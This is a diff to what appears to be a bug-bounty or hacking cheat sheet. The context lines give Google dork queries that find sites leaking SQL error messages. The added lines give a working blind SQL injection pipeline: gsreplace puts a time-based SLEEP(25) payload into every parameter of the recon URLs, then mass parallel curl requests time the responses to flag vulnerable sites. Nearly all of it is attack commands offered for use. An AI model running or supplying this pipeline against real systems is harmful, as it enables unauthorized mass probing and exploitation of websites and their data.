@@ -720,7 +720,9 @@ site:*.com intext:"error in your SQL syntax"
 Use this keyword:
 site:test.com intext:”sql syntax near” | intext:”syntax error has occurred” | intext:”incorrect syntax near” | intext:”unexpected end of SQL command” | intext:”Warning: mysql_connect()” | intext:”Warning: mysql_query()” | intext:”Warning: pg_connect()”
 
-
+BLIND SQLI
+cat recon.txt | grep "=" | gsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(25)))SUmc)" >> blind.txt ==> to wait for 25 seconds
+ cat blind.txt | parallel -j50 -q curl -o /dev/null -s -w %{time_total}\\n	==> to count time blind if 25 then vulnerable
 
 
 
